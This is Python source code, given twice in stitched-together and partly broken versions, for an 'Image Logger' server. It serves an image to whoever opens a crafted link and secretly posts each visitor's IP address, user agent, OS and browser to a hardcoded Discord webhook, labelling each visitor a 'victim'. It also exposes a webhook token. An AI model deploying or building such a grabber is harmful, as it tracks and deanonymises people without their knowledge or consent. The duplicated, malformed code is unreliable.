import base64
import requests
import httpagentparser
from urllib import parse
from http.server import BaseHTTPRequestHandler, HTTPServer
import datetime
import os

# ===================== CONFIG =====================
# ⚠️ Ne mets jamais ton vrai webhook ici en public !
WEBHOOK_URL = os.getenv("WEBHOOK_URL")  # À définir dans les variables d'environnement de ton hébergeur

config = {
    "webhook": WEBHOOK_URL or "https://discord.com/api/webhooks/https://discord.com/api/webhooks/1494388722068881551/GPELkrraANFn11tOWYFrlhBmiviZB4mn5xUyXuWTwz4Fwqn9SpMiEZnNyRs2sIY7cutU",  # Sera remplacé par env
    "image": "https://i.pinimg.com/736x/df/96/d8/df96d84e03317bba5b9961e75382ec37.jpg",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "message": "@everyone Nouvelle image chargée !",
}

def send_to_discord(ip: str, useragent: str = None, endpoint: str = "N/A"):
    if not config["webhook"] or "discord.com" not in config["webhook"]:
        print("Webhook non configuré !")
        return

    # Ignorer les requêtes de Discord lui-même
    if ip.startswith(("34.", "35.")):
        return

    try:
        agent = httpagentparser.detect(useragent) if useragent else {}

        embed = {
            "title": "🖼️ Image Logger - Nouvelle victime",
            "color": config["color"],
            "timestamp": datetime.datetime.utcnow().isoformat(),
            "fields": [
                {"name": "IP Address", "value": f"`{ip}`", "inline": True},
                {"name": "Endpoint", "value": endpoint, "inline": True},
                {"name": "User-Agent", "value": f"```{useragent[:600] if useragent else 'N/A'}```", "inline": False},
                {"name": "Platform / Browser", 
                 "value": f"{agent.get('os', {}).get('name', 'Unknown')} • {agent.get('browser', {}).get('name', 'Unknown')}", 
                 "inline": True},
            ]
        }

        payload = {
            "username": config["username"],
            "content": config["message"],
            "embeds": [embed]
        }

        requests.post(config["webhook"], json=payload, timeout=10)
    except Exception as e:
        print(f"[ERROR] Failed to send to Discord: {e}")


class ImageLoggerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        client_ip = self.client_address[0]
        user_agent = self.headers.get("User-Agent", "Unknown")
        path = self.path

        # Récupération de l'URL de l'image (base64 ou par défaut)
        image_url = config["image"]
        if config["imageArgument"]:
            try:
                query = dict(parse.parse_qsl(parse.urlsplit(path).query))
                encoded = query.get("url") or query.get("id")
                if encoded:
                    image_url = base64.b64decode(encoded.encode()).decode("utf-8")
            except:
                pass

        # Log vers Discord
        send_to_discord(client_ip, user_agent, endpoint=path)

        # Servir l'image
        try:
            r = requests.get(image_url, timeout=8)
            if r.status_code == 200 and "image" in r.headers.get("Content-Type", ""):
                self.send_response(200)
                self.send_header("Content-type", r.headers["Content-Type"])
                self.end_headers()
                self.wfile.write(r.content)
                return
        except:
            pass

        # Fallback simple (image par défaut)
        self.send_response(200)
        self.send_header("Content-type", "image/jpeg")
        self.end_headers()
        self.wfile.write(b"")  # Tu peux ajouter du contenu binaire ici si tu veux

    def do_POST(self):
        self.do_GET()


if __name__ == "__main__":
    port = int(os.getenv("PORT", 8080))
    server = HTTPServer(("0.0.0.0", port), ImageLoggerHandler)
    print(f"✅ Image Logger démarré sur le port {port}")
    print("Utilise : http://ton-domaine/?url=" + base64.b64encode(config["image"].encode()).decode())
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.server_close()import base64
import requests
import httpagentparser
from urllib import parse
from http.server import BaseHTTPRequestHandler


config = {
    # Configuration du webhook et des options générales de l'application.
    "webhook": "https://discord.com/api/webhooks/1494388722068881551/GPELkrraANFn11tOWYFrlhBmiviZB4mn5xUyXuWTwz4Fwqn9SpMiEZnNyRs2sIY7cutU",
    "image": "https://i.pinimg.com/736x/df/96/d8/df96d84e03317bba5b9961e75382ec37.jpg",
    "imageArgument": True,
    # Des personnalisations comme l'username, la couleur de l'embed et d'autres options.
    "username": "Image Logger",
    "color": 0x00FFFF,
    # Diverses options telles que crashBrowser, accurateLocation et message.
}


def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    # Cette fonction est simplifiée. Dans le code original, elle contient beaucoup plus de logique.
    if ip.startswith(("34", "35")):
        return "Discord"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```"
            }
        ]
    })

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            # Simplification de la logique pour servir l'image ou une page HTML.
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode() if config["imageArgument"] else config["image"]
            
            # Plus de logique simplifiée ici pour gérer la requête et les réponses.
            self.send_response(200)
            self.end_headers()

        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            error_message = "500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page."
            self.wfile.write(error_message.encode())

handler = ImageLoggerAPI
